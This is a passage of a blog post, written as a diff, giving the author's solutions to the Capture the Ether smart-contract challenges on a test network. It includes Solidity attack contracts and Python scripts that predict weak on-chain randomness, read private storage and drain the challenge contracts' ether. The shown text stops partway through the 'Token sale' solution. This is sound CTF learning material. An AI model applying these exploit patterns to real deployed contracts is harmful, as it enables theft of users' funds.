@@ -1,0 +1,1017 @@
+<h1 id="capture-the-ether-solutions">Capture the Ether solutions</h1>
+<div class="date">
+  <span class="smaller"><b>July 24th, 2022</b></span>
+</div>
+<div class="centerPosition"><hr></div>
+<p>This article is a collection of my solutions to the Capture the Ether challenges. In this article I will basically copy-paste all my solution write-ups from the <a href="https://github.com/dreth/CaptureTheEther">github repo</a> where my solutions and scripts are.</p>
+<p>I solved these in a local brownie (smart contract development framework on python) using a local fork of the ropsten test network. After solving each challenge, I then ran the scripts that would perform the transactions on the test network itself to solve the challenges. Same as with the <a href="https://dac.ac/blog/ethernaut_solutions">Ethernaut challenges</a>.</p>
+<p>If you want to reproduce the same environment I used for it, you can do so by following the instructions in the <a href="https://github.com/dreth/CaptureTheEther/blob/main/README.md">readme of that same github repo</a>.</p>
+<hr>
+<h2 id="article-index">Article index</h2>
+<ul>
+<li><a href="#warmup">Warmup</a>
+<ul>
+<li><a href="#call-me">Call me</a>
+<ul>
+<li><a href="#objectives">Objectives</a></li>
+<li><a href="#solution">Solution</a></li>
+<li><a href="#submission-transaction">Submission transaction</a></li>
+</ul>
+</li>
+<li><a href="#choose-a-nickname">Choose a nickname</a>
+<ul>
+<li><a href="#objectives-1">Objectives</a></li>
+<li><a href="#solution-1">Solution</a></li>
+<li><a href="#submission-transaction-1">Submission transaction</a></li>
+</ul>
+</li>
+</ul>
+</li>
+<li><a href="#lotteries">Lotteries</a>
+<ul>
+<li><a href="#guess-the-number">Guess the number</a>
+<ul>
+<li><a href="#objectives-2">Objectives</a></li>
+<li><a href="#solution-2">Solution</a></li>
+<li><a href="#submission-transaction-2">Submission transaction</a></li>
+</ul>
+</li>
+<li><a href="#guess-the-secret-number">Guess the secret number</a>
+<ul>
+<li><a href="#objectives-3">Objectives</a></li>
+<li><a href="#solution-3">Solution</a></li>
+<li><a href="#submission-transaction-3">Submission transaction</a></li>
+</ul>
+</li>
+<li><a href="#guess-the-random-number">Guess the random number</a>
+<ul>
+<li><a href="#objectives-4">Objectives</a></li>
+<li><a href="#solution-4">Solution</a></li>
+<li><a href="#submission-transaction-4">Submission transaction</a></li>
+</ul>
+</li>
+<li><a href="#guess-the-new-number">Guess the new number</a>
+<ul>
+<li><a href="#objectives-5">Objectives</a></li>
+<li><a href="#solution-5">Solution</a></li>
+<li><a href="#submission-transaction-5">Submission transaction</a></li>
+</ul>
+</li>
+<li><a href="#predict-the-future">Predict the future</a>
+<ul>
+<li><a href="#objectives-6">Objectives</a></li>
+<li><a href="#solution-6">Solution</a></li>
+<li><a href="#submission-transaction-6">Submission transaction</a></li>
+</ul>
+</li>
+<li><a href="#predict-the-block-hash">Predict the block hash</a>
+<ul>
+<li><a href="#objectives-7">Objectives</a></li>
+<li><a href="#solution-7">Solution</a></li>
+<li><a href="#submission-transaction-7">Submission transaction</a></li>
+</ul>
+</li>
+</ul>
+</li>
+<li><a href="#math">Math</a>
+<ul>
+<li><a href="#token-sale">Token sale</a>
+<ul>
+<li><a href="#objectives-8">Objectives</a></li>
+<li><a href="#solution-8">Solution</a></li>
+<li><a href="#alternative-better-solution">Alternative (better) solution</a></li>
+<li><a href="#submission-transaction-8">Submission transaction</a></li>
+</ul>
+</li>
+<li><a href="#token-whale">Token whale</a>
+<ul>
+<li><a href="#objectives-9">Objectives</a></li>
+<li><a href="#solution-9">Solution</a></li>
+<li><a href="#submission-transaction-9">Submission transaction</a></li>
+</ul>
+</li>
+<li><a href="#retirement-fund">Retirement fund</a>
+<ul>
+<li><a href="#objectives-10">Objectives</a></li>
+<li><a href="#solution-10">Solution</a></li>
+<li><a href="#submission-transaction-10">Submission transaction</a></li>
+</ul>
+</li>
+<li><a href="#mapping">Mapping</a>
+<ul>
+<li><a href="#objectives-11">Objectives</a></li>
+<li><a href="#solution-11">Solution</a></li>
+<li><a href="#submission-transaction-11">Submission transaction</a></li>
+</ul>
+</li>
+<li><a href="#donation">Donation</a>
+<ul>
+<li><a href="#objectives-12">Objectives</a></li>
+<li><a href="#solution-12">Solution</a></li>
+<li><a href="#submission-transaction-12">Submission transaction</a></li>
+</ul>
+</li>
+<li><a href="#fifty-years">Fifty years</a>
+<ul>
+<li><a href="#objectives-13">Objectives</a></li>
+<li><a href="#solution-13">Solution</a></li>
+<li><a href="#submission-transaction-13">Submission transaction</a></li>
+</ul>
+</li>
+</ul>
+</li>
+<li><a href="#accounts">Accounts</a>
+<ul>
+<li><a href="#fuzzy-identity">Fuzzy identity</a>
+<ul>
+<li><a href="#objectives-14">Objectives</a></li>
+<li><a href="#solution-14">Solution</a></li>
+<li><a href="#my-bruteforce-result">My bruteforce result</a></li>
+<li><a href="#submission-transaction-14">Submission transaction</a></li>
+</ul>
+</li>
+<li><a href="#public-key">Public key</a>
+<ul>
+<li><a href="#objectives-15">Objectives</a></li>
+<li><a href="#solution-15">Solution</a></li>
+<li><a href="#submission-transaction-15">Submission transaction</a></li>
+</ul>
+</li>
+<li><a href="#account-takeover">Account takeover</a>
+<ul>
+<li><a href="#objectives-16">Objectives</a></li>
+<li><a href="#solution-16">Solution</a></li>
+<li><a href="#parameters-required">Parameters required</a>
+<ul>
+<li><a href="#r"><code>r</code></a></li>
+<li><a href="#s"><code>s</code></a></li>
+<li><a href="#z"><code>z</code></a></li>
+</ul>
+</li>
+<li><a href="#obtaining-the-private-key">Obtaining the private key</a></li>
+<li><a href="#python-implementation">Python implementation</a></li>
+<li><a href="#submission-transaction-16">Submission transaction</a></li>
+</ul>
+</li>
+</ul>
+</li>
+<li><a href="#miscellaneous">Miscellaneous</a>
+<ul>
+<li><a href="#assume-ownership">Assume ownership</a>
+<ul>
+<li><a href="#objectives-17">Objectives</a></li>
+<li><a href="#solution-17">Solution</a></li>
+<li><a href="#submission-transaction-17">Submission transaction</a></li>
+</ul>
+</li>
+<li><a href="#token-bank">Token bank</a>
+<ul>
+<li><a href="#objectives-18">Objectives</a></li>
+<li><a href="#solution-18">Solution</a></li>
+<li><a href="#submission-transaction-18">Submission transaction</a></li>
+</ul>
+</li>
+</ul>
+</li>
+</ul>
+<hr>
+<h2 id="warmup">Warmup</h2>
+<h3 id="call-me">Call me</h3>
+<h4 id="objectives">Objectives</h4>
+<blockquote>
+<p>To complete this challenge, all you need to do is call a function.</p>
+</blockquote>
+<h4 id="solution">Solution</h4>
+<p>Call the <code>callme()</code> function to turn <code>isComplete</code> into <code>true</code>.</p>
+<h4 id="submission-transaction">Submission transaction</h4>
+<p><a href="https://ropsten.etherscan.io/tx/0xc65c52bbf6f4b79832a12a24cd3fb654dc021b74c055f46530b3dde55b0a3866">https://ropsten.etherscan.io/tx/0xc65c52bbf6f4b79832a12a24cd3fb654dc021b74c055f46530b3dde55b0a3866</a></p>
+<hr>
+<h3 id="choose-a-nickname">Choose a nickname</h3>
+<h4 id="objectives-1">Objectives</h4>
+<blockquote>
+<p>To complete this challenge, set your nickname to a non-empty string.</p>
+</blockquote>
+<h4 id="solution-1">Solution</h4>
+<p>All we have to do is call <code>setNickname()</code> on the CaptureTheEther contract with the nickname as hex. In brownie I did this by encoding the string and passing in the hex value:</p>
+<pre class=" language-python"><code class="prism  language-python">cte<span class="token punctuation">.</span>setNickname<span class="token punctuation">(</span><span class="token string">"zooberto"</span><span class="token punctuation">.</span>encode<span class="token punctuation">(</span><span class="token string">'utf8'</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token builtin">hex</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">,</span> _from<span class="token punctuation">)</span>
+</code></pre>
+<h4 id="submission-transaction-1">Submission transaction</h4>
+<p><a href="https://ropsten.etherscan.io/tx/0x5033e566d085e7a00206039798fbaa7e88e8eba1212853351a28358672d4fb48">https://ropsten.etherscan.io/tx/0x5033e566d085e7a00206039798fbaa7e88e8eba1212853351a28358672d4fb48</a></p>
+<hr>
+<h2 id="lotteries">Lotteries</h2>
+<h3 id="guess-the-number">Guess the number</h3>
+<h4 id="objectives-2">Objectives</h4>
+<blockquote>
+<p>I’m thinking of a number. All you have to do is guess it.</p>
+</blockquote>
+<h4 id="solution-2">Solution</h4>
+<p>The solution is in the state variable <code>answer</code>, which is 42. All we have to do is call <code>guess()</code> passing 42 and with a value of 1 ether. This will return the entire balance of the contract, which is 1 ether on deployment as per the constructor + 1 ether that we send to be able to call <code>guess()</code>.</p>
+<h4 id="submission-transaction-2">Submission transaction</h4>
+<p><a href="https://ropsten.etherscan.io/tx/0x9d8685713a4bbbdc744b5ce040c8c2107e9e5be7e0a672d1621943f08b8460b0">https://ropsten.etherscan.io/tx/0x9d8685713a4bbbdc744b5ce040c8c2107e9e5be7e0a672d1621943f08b8460b0</a></p>
+<hr>
+<h3 id="guess-the-secret-number">Guess the secret number</h3>
+<h4 id="objectives-3">Objectives</h4>
+<blockquote>
+<p>This time I’ve only stored the hash of the number. Good luck reversing a cryptographic hash!</p>
+</blockquote>
+<h4 id="solution-3">Solution</h4>
+<p>It’s not easy to reverse a hash, but it’s easy to try out the entire possible set of answers (<span class="katex--inline"><span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><msup><mn>2</mn><mn>8</mn></msup><mo>−</mo><mn>1</mn></mrow><annotation encoding="application/x-tex">2^8 - 1</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height: 0.897438em; vertical-align: -0.08333em;"></span><span class="mord"><span class="mord">2</span><span class="msupsub"><span class="vlist-t"><span class="vlist-r"><span class="vlist" style="height: 0.814108em;"><span class="" style="top: -3.063em; margin-right: 0.05em;"><span class="pstrut" style="height: 2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight">8</span></span></span></span></span></span></span></span><span class="mspace" style="margin-right: 0.222222em;"></span><span class="mbin">−</span><span class="mspace" style="margin-right: 0.222222em;"></span></span><span class="base"><span class="strut" style="height: 0.64444em; vertical-align: 0em;"></span><span class="mord">1</span></span></span></span></span>), as the answer <code>n</code> is a uint8. We can easily bruteforce this by just hashing all <span class="katex--inline"><span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi>x</mi></mrow><annotation encoding="application/x-tex">x</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height: 0.43056em; vertical-align: 0em;"></span><span class="mord mathnormal">x</span></span></span></span></span> with <span class="katex--inline"><span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mn>0</mn><mo>≤</mo><mi>x</mi><mo>≤</mo><msup><mn>2</mn><mn>8</mn></msup><mo>−</mo><mn>1</mn></mrow><annotation encoding="application/x-tex">0 \leq x \leq 2^8 - 1</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height: 0.78041em; vertical-align: -0.13597em;"></span><span class="mord">0</span><span class="mspace" style="margin-right: 0.277778em;"></span><span class="mrel">≤</span><span class="mspace" style="margin-right: 0.277778em;"></span></span><span class="base"><span class="strut" style="height: 0.77194em; vertical-align: -0.13597em;"></span><span class="mord mathnormal">x</span><span class="mspace" style="margin-right: 0.277778em;"></span><span class="mrel">≤</span><span class="mspace" style="margin-right: 0.277778em;"></span></span><span class="base"><span class="strut" style="height: 0.897438em; vertical-align: -0.08333em;"></span><span class="mord"><span class="mord">2</span><span class="msupsub"><span class="vlist-t"><span class="vlist-r"><span class="vlist" style="height: 0.814108em;"><span class="" style="top: -3.063em; margin-right: 0.05em;"><span class="pstrut" style="height: 2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight">8</span></span></span></span></span></span></span></span><span class="mspace" style="margin-right: 0.222222em;"></span><span class="mbin">−</span><span class="mspace" style="margin-right: 0.222222em;"></span></span><span class="base"><span class="strut" style="height: 0.64444em; vertical-align: 0em;"></span><span class="mord">1</span></span></span></span></span> and comparing the resulting hash with <code>answerHash</code>.</p>
+<p>The correct <code>n</code> turns out to be 170.</p>
+<h4 id="submission-transaction-3">Submission transaction</h4>
+<p><a href="https://ropsten.etherscan.io/tx/0x338819d91537aa6dc17be67cf32dbc1e14fd7ef341a3d50239bc9b9de129be31">https://ropsten.etherscan.io/tx/0x338819d91537aa6dc17be67cf32dbc1e14fd7ef341a3d50239bc9b9de129be31</a></p>
+<hr>
+<h3 id="guess-the-random-number">Guess the random number</h3>
+<h4 id="objectives-4">Objectives</h4>
+<blockquote>
+<p>This time the number is generated based on a couple fairly random sources.</p>
+</blockquote>
+<h4 id="solution-4">Solution</h4>
+<p>We can deduct the number from the keccak256 hash of the block hash and the time in which the contract is deployed.</p>
+<p>Alternatively, we can just pull the number from the state variable <code>answer</code> in the storage slot <code>0x</code>.</p>
+<p>I did the latter as follows:</p>
+<pre class=" language-python"><code class="prism  language-python">answer <span class="token operator">=</span> <span class="token builtin">int</span><span class="token punctuation">(</span>web3<span class="token punctuation">.</span>eth<span class="token punctuation">.</span>get_storage_at<span class="token punctuation">(</span>guess_the_random_number<span class="token punctuation">.</span>address<span class="token punctuation">,</span> <span class="token string">'0x'</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token builtin">hex</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">,</span> <span class="token number">16</span><span class="token punctuation">)</span>
+</code></pre>
+<h4 id="submission-transaction-4">Submission transaction</h4>
+<p><a href="https://ropsten.etherscan.io/tx/0xdd49b0fffad32c5de917f4a6436ca975e7c33358fa009407c86ef7954f9a0d98">https://ropsten.etherscan.io/tx/0xdd49b0fffad32c5de917f4a6436ca975e7c33358fa009407c86ef7954f9a0d98</a></p>
+<hr>
+<h3 id="guess-the-new-number">Guess the new number</h3>
+<h4 id="objectives-5">Objectives</h4>
+<blockquote>
+<p>The number is now generated on-demand when a guess is made.</p>
+</blockquote>
+<h4 id="solution-5">Solution</h4>
+<p>We just need to code a contract that generates the number the exact same way prior to guessing it. <s>For some reason that I don’t quite understand though, the <code>guess()</code> call simply would not go through until I tried to do it through the constructor of the contract.</s> I simply didn’t have a fallback function to receive the funds, so it worked in the constructor of the contract because before finalizing constructor execution, the funds would have already been sent to my address, but if a fallback function is added, then the funds can be properly received by the contract and the transactions won’t fail.</p>
+<p>I coded the contract as follows:</p>
+<pre class=" language-js"><code class="prism  language-js"><span class="token comment">// SPDX-License-Identifier: MIT</span>
+pragma solidity <span class="token operator">&gt;=</span><span class="token number">0.7</span><span class="token punctuation">.</span><span class="token number">5</span> <span class="token operator">&lt;</span><span class="token number">0.8</span><span class="token punctuation">.</span><span class="token number">0</span><span class="token punctuation">;</span>
+
+contract GuessTheNewNumberAttack <span class="token punctuation">{</span>
+    <span class="token function">constructor</span><span class="token punctuation">(</span>address payable challenge<span class="token punctuation">)</span> <span class="token keyword">public</span> payable <span class="token punctuation">{</span>
+        <span class="token comment">// low-level call success</span>
+        bool success<span class="token punctuation">;</span>
+
+        <span class="token comment">// check that we're forwarding the correct amount of funds</span>
+        <span class="token function">require</span><span class="token punctuation">(</span>msg<span class="token punctuation">.</span>value <span class="token operator">==</span> <span class="token number">1</span> ether<span class="token punctuation">,</span> <span class="token string">'msg.value should be at least 1 ether'</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+
+        <span class="token comment">// get answer</span>
+        uint8 answer <span class="token operator">=</span> <span class="token function">uint8</span><span class="token punctuation">(</span><span class="token function">uint256</span><span class="token punctuation">(</span><span class="token function">keccak256</span><span class="token punctuation">(</span>abi<span class="token punctuation">.</span><span class="token function">encodePacked</span><span class="token punctuation">(</span><span class="token function">blockhash</span><span class="token punctuation">(</span>block<span class="token punctuation">.</span>number <span class="token operator">-</span> <span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">,</span> block<span class="token punctuation">.</span>timestamp<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+        
+        <span class="token comment">// make the guess</span>
+        <span class="token punctuation">(</span>success<span class="token punctuation">,</span><span class="token punctuation">)</span> <span class="token operator">=</span> challenge<span class="token punctuation">.</span>call<span class="token punctuation">{</span>value<span class="token punctuation">:</span><span class="token number">1</span> ether<span class="token punctuation">}</span><span class="token punctuation">(</span>abi<span class="token punctuation">.</span><span class="token function">encodeWithSignature</span><span class="token punctuation">(</span><span class="token string">"guess(uint8)"</span><span class="token punctuation">,</span> answer<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+        <span class="token function">require</span><span class="token punctuation">(</span>success<span class="token punctuation">,</span> <span class="token string">"guess failed"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+
+        <span class="token comment">// send funds back to my account</span>
+        <span class="token punctuation">(</span>success<span class="token punctuation">,</span><span class="token punctuation">)</span> <span class="token operator">=</span> msg<span class="token punctuation">.</span>sender<span class="token punctuation">.</span>call<span class="token punctuation">{</span>value<span class="token punctuation">:</span><span class="token function">address</span><span class="token punctuation">(</span><span class="token keyword">this</span><span class="token punctuation">)</span><span class="token punctuation">.</span>balance<span class="token punctuation">}</span><span class="token punctuation">(</span><span class="token string">""</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+        <span class="token function">require</span><span class="token punctuation">(</span>success<span class="token punctuation">,</span> <span class="token string">'call failed'</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+    <span class="token punctuation">}</span>
+<span class="token punctuation">}</span>
+</code></pre>
+<p>On deployment, the guess was successful (as it runs in the constructor) and the balance is sent back to my wallet. By simply deploying this contract, the challenge is solved.</p>
+<p>This can be solved similarly in the same version of the solidity compiler that the challenge is originally using (0.4.21), but given that I’m using a newer version, there’s some small nuances due to changes in the solidity compiler since then:</p>
+<ul>
+<li><code>block.blockhash()</code> has been replaced by <code>blockhash()</code></li>
+<li><code>now</code> has been deprecated in favor of <code>block.timestamp</code></li>
+<li>Now it’s not possible to pass multiple parameters to the <code>keccak256()</code> hash function, so we must use <code>abi.encodePacked()</code> before passing it to <code>keccak256()</code></li>
+<li>It is not possible to cast directly from a hash to uint8, so we must first pass through a type that has the same size in bytes as the value returned by the hash function, so we first cast to uint256 and then to uint8.</li>
+</ul>
+<h4 id="submission-transaction-5">Submission transaction</h4>
+<p><a href="https://ropsten.etherscan.io/tx/0x9127996a2073acf24ecbfbd3b7f2eeba379c91815658b98e641c7035060a1eba">https://ropsten.etherscan.io/tx/0x9127996a2073acf24ecbfbd3b7f2eeba379c91815658b98e641c7035060a1eba</a></p>
+<hr>
+<h3 id="predict-the-future">Predict the future</h3>
+<h4 id="objectives-6">Objectives</h4>
+<blockquote>
+<p>This time, you have to lock in your guess before the random number is generated. To give you a sporting chance, there are only ten possible answers.</p>
+</blockquote>
+<blockquote>
+<p>Note that it is indeed possible to solve this challenge without losing any ether.</p>
+</blockquote>
+<h4 id="solution-6">Solution</h4>
+<p>We have to follow a few steps here:</p>
+<ol>
+<li>
+<p>Code and deploy a contract with at least 3 functions:</p>
+<ul>
+<li>One that locks in the guess (calling <code>lockInGuess()</code>)</li>
+<li>One that calls <code>settle()</code> but <em>only</em> if it <em>knows</em> the guess will work</li>
+<li>One fallback function to receive ETH</li>
+</ul>
+</li>
+<li>
+<p>The function that calls <code>settle()</code> is specially important, it has to generate the answer just like the PredictTheFutureChallenge contract, but it should only attempt to do this settle if the answer is equal to the guess made when we call <code>lockInGuess()</code>. I defined it as follows:</p>
+</li>
+</ol>
+<pre class=" language-js"><code class="prism  language-js"><span class="token keyword">function</span> <span class="token function">callSettle</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token keyword">public</span> <span class="token punctuation">{</span>
+    <span class="token comment">// prevent the tx from continuing if the answer is not going to pass as correct</span>
+    uint8 answer <span class="token operator">=</span> <span class="token function">uint8</span><span class="token punctuation">(</span><span class="token function">uint256</span><span class="token punctuation">(</span><span class="token function">keccak256</span><span class="token punctuation">(</span>abi<span class="token punctuation">.</span><span class="token function">encodePacked</span><span class="token punctuation">(</span><span class="token function">blockhash</span><span class="token punctuation">(</span>block<span class="token punctuation">.</span>number <span class="token operator">-</span> <span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">,</span> block<span class="token punctuation">.</span>timestamp<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token operator">%</span> <span class="token number">10</span><span class="token punctuation">;</span>
+    <span class="token function">require</span><span class="token punctuation">(</span>answer <span class="token operator">==</span> <span class="token number">0</span><span class="token punctuation">,</span> <span class="token string">"tx will fail and guesser will be overwritten"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+
+    <span class="token comment">// make the guess and check if the challenge is complete, otherwise revert</span>
+    challenge<span class="token punctuation">.</span><span class="token function">settle</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+    <span class="token function">require</span><span class="token punctuation">(</span>challenge<span class="token punctuation">.</span><span class="token function">isComplete</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">,</span> <span class="token string">"challenge not complete yet"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+    
+
+    <span class="token comment">// send funds to my address</span>
+    <span class="token punctuation">(</span>bool success<span class="token punctuation">,</span><span class="token punctuation">)</span> <span class="token operator">=</span> msg<span class="token punctuation">.</span>sender<span class="token punctuation">.</span>call<span class="token punctuation">{</span>value<span class="token punctuation">:</span><span class="token function">address</span><span class="token punctuation">(</span><span class="token keyword">this</span><span class="token punctuation">)</span><span class="token punctuation">.</span>balance<span class="token punctuation">}</span><span class="token punctuation">(</span><span class="token string">""</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+    <span class="token function">require</span><span class="token punctuation">(</span>success<span class="token punctuation">,</span> <span class="token string">"call failed"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+<span class="token punctuation">}</span>
+</code></pre>
+<ol start="3">
+<li>Iteratively call this <code>callSettle()</code> function until the guess goes through. I did it as follows:</li>
+</ol>
+<pre class=" language-python"><code class="prism  language-python"><span class="token comment"># call settle until it works, because `guess` is already 0</span>
+<span class="token keyword">while</span> <span class="token boolean">True</span><span class="token punctuation">:</span>
+    <span class="token comment"># check if the challenge is completed</span>
+    result <span class="token operator">=</span> predict_the_future<span class="token punctuation">.</span>isComplete<span class="token punctuation">(</span><span class="token punctuation">)</span>
+    <span class="token keyword">print</span><span class="token punctuation">(</span>f<span class="token string">'The challenge is complete: {result}'</span><span class="token punctuation">)</span>
+    <span class="token keyword">if</span> result<span class="token punctuation">:</span>
+        <span class="token keyword">break</span>
+    
+    <span class="token comment"># call settle</span>
+    <span class="token keyword">try</span><span class="token punctuation">:</span>
+        attacker<span class="token punctuation">.</span>callSettle<span class="token punctuation">(</span>_from <span class="token operator">|</span> <span class="token punctuation">{</span><span class="token string">'allow_revert'</span><span class="token punctuation">:</span><span class="token boolean">True</span><span class="token punctuation">}</span><span class="token punctuation">)</span>
+    <span class="token keyword">except</span><span class="token punctuation">:</span>
+        <span class="token keyword">pass</span>
+
+    <span class="token comment"># check if the guesser has been overwritten</span>
+    guesser <span class="token operator">=</span> web3<span class="token punctuation">.</span>eth<span class="token punctuation">.</span>get_storage_at<span class="token punctuation">(</span>predict_the_future<span class="token punctuation">.</span>address<span class="token punctuation">,</span> <span class="token string">'0x'</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token builtin">hex</span><span class="token punctuation">(</span><span class="token punctuation">)</span>
+    <span class="token keyword">print</span><span class="token punctuation">(</span>f<span class="token string">'The guesser is: {guesser}'</span><span class="token punctuation">)</span>
+    <span class="token keyword">if</span> attacker<span class="token punctuation">.</span>address<span class="token punctuation">[</span><span class="token operator">-</span><span class="token number">40</span><span class="token punctuation">:</span><span class="token punctuation">]</span><span class="token punctuation">.</span>upper<span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token operator">!=</span> guesser<span class="token punctuation">[</span><span class="token operator">-</span><span class="token number">40</span><span class="token punctuation">:</span><span class="token punctuation">]</span><span class="token punctuation">.</span>upper<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">:</span>
+        <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">'guesser has been overwritten'</span><span class="token punctuation">)</span>
+        <span class="token keyword">break</span>
+</code></pre>
+<p>Here I call the function until either the challenge is complete, or if the guesser changes to the null address. I had this last check because if I were to generate a different guess than what I coded in the attacker contract and the <code>settle()</code> function was successfully called, then we would have to call <code>lockInGuess()</code> again to make <code>guesser = msg.sender</code> and not the null address. This scenario, however, is probably not possible.</p>
+<p>Eventually, after a few tries, the attempt will go through if it passes. This can still be done if the set of possible answers is larger than just 10, but it would probably take much longer (unless we get lucky).</p>
+<h4 id="submission-transaction-6">Submission transaction</h4>
+<p><a href="https://ropsten.etherscan.io/tx/0xb065fda4383b65408dd6f021f12071a44b4d44d24106fd5be006287f2fee4d05">https://ropsten.etherscan.io/tx/0xb065fda4383b65408dd6f021f12071a44b4d44d24106fd5be006287f2fee4d05</a></p>
+<hr>
+<h3 id="predict-the-block-hash">Predict the block hash</h3>
+<h4 id="objectives-7">Objectives</h4>
+<blockquote>
+<p>Guessing an 8-bit number is apparently too easy. This time, you need to predict the entire 256-bit block hash for a future block.</p>
+</blockquote>
+<h4 id="solution-7">Solution</h4>
+<p>In both the Solidity compiler version 0.4.21 (for <code>block.blockhash()</code>) and ^0.8.0 (for <code>blockhash()</code>), the function to obtain the block hash from a block number only returns the hash for the 256 most recent blocks.</p>
+<p>As a result, to pass the challenge we must:</p>
+<ol>
+<li>Call <code>lockInGuess()</code> with the <code>hash</code> value <code>0x0000000000000000000000000000000000000000000000000000000000000000</code></li>
+<li>Wait for this previous transaction to have about 256 block confirmations</li>
+<li>Call the <code>settle()</code> function, which should now <em>always</em> return <code>0x0000000000000000000000000000000000000000000000000000000000000000</code> for <code>answer</code>, given that <code>settlementBlockNumber</code> will be 256+ blocks in the past.</li>
+</ol>
+<h4 id="submission-transaction-7">Submission transaction</h4>
+<hr>
+<h2 id="math">Math</h2>
+<h3 id="token-sale">Token sale</h3>
+<h4 id="objectives-8">Objectives</h4>
+<blockquote>
+<p>This token contract allows you to buy and sell tokens at an even exchange rate of 1 token per ether.<br>
+The contract starts off with a balance of 1 ether. See if you can take some of that away.</p>
+</blockquote>
+<h4 id="solution-8">Solution</h4>
+<p>While <em>incredibly</em> simple, this problem took me <em>days</em> to solve, as I was not aware (or forgot) of a few things:</p>
+<ul>
+<li>Floating point numbers do not exist in Solidity (as of writing this).</li>
+<li>Operations in Solidity between whole numbers which would yield a floating point number are immediate rounded down at <em>every step</em>, so an arithmetic equation consisting of multiple operations would be applied a floor function at every step of the operation, e.g. <span class="katex--inline"><span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mn>2</mn><mo>÷</mo><mn>3</mn><mo>∗</mo><mn>7</mn><mo>÷</mo><mn>2</mn><mo>→</mo><mo stretchy="false">⌊</mo><mo stretchy="false">⌊</mo><mo stretchy="false">⌊</mo><mn>2</mn><mo>÷</mo><mn>23</mn><mo stretchy="false">⌋</mo><mo>∗</mo><mn>7</mn><mo stretchy="false">⌋</mo><mo>÷</mo><mn>2</mn><mo stretchy="false">⌋</mo></mrow><annotation encoding="application/x-tex">2 \div 3 * 7 \div 2 \rightarrow \lfloor\lfloor\lfloor 2 \div 23 \rfloor * 7 \rfloor \div 2 \rfloor</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height: 0.72777em; vertical-align: -0.08333em;"></span><span class="mord">2</span><span class="mspace" style="margin-right: 0.222222em;"></span><span class="mbin">÷</span><span class="mspace" style="margin-right: 0.222222em;"></span></span><span class="base"><span class="strut" style="height: 0.64444em; vertical-align: 0em;"></span><span class="mord">3</span><span class="mspace" style="margin-right: 0.222222em;"></span><span class="mbin">∗</span><span class="mspace" style="margin-right: 0.222222em;"></span></span><span class="base"><span class="strut" style="height: 0.72777em; vertical-align: -0.08333em;"></span><span class="mord">7</span><span class="mspace" style="margin-right: 0.222222em;"></span><span class="mbin">÷</span><span class="mspace" style="margin-right: 0.222222em;"></span></span><span class="base"><span class="strut" style="height: 0.64444em; vertical-align: 0em;"></span><span class="mord">2</span><span class="mspace" style="margin-right: 0.277778em;"></span><span class="mrel">→</span><span class="mspace" style="margin-right: 0.277778em;"></span></span><span class="base"><span class="strut" style="height: 1em; vertical-align: -0.25em;"></span><span class="mopen">⌊⌊⌊</span><span class="mord">2</span><span class="mspace" style="margin-right: 0.222222em;"></span><span class="mbin">÷</span><span class="mspace" style="margin-right: 0.222222em;"></span></span><span class="base"><span class="strut" style="height: 1em; vertical-align: -0.25em;"></span><span class="mord">23</span><span class="mclose">⌋</span><span class="mspace" style="margin-right: 0.222222em;"></span><span class="mbin">∗</span><span class="mspace" style="margin-right: 0.222222em;"></span></span><span class="base"><span class="strut" style="height: 1em; vertical-align: -0.25em;"></span><span class="mord">7</span><span class="mclose">⌋</span><span class="mspace" style="margin-right: 0.222222em;"></span><span class="mbin">÷</span><span class="mspace" style="margin-right: 0.222222em;"></span></span><span class="base"><span class="strut" style="height: 1em; vertical-align: -0.25em;"></span><span class="mord">2</span><span class="mclose">⌋</span></span></span></span></span>.</li>
+<li>It is extremely difficult to get a perfect 0 after an integer overflow using products, therefore, in order to solve this problem, it’s nearly impossible that the price for which I’ll be able to buy the tokens (each worth 1 ether) will be <em>exactly</em> zero wei.</li>
+<li>I completely forgot that python will do things in the background with math, like for example: <code>1e18</code> is immediately considered a float, even though it’s a whole number, therefore, to have <code>1e18</code> as an integer, I should be writing <code>int(1e18)</code>.</li>
+</ul>
+<p>To solve it:</p>
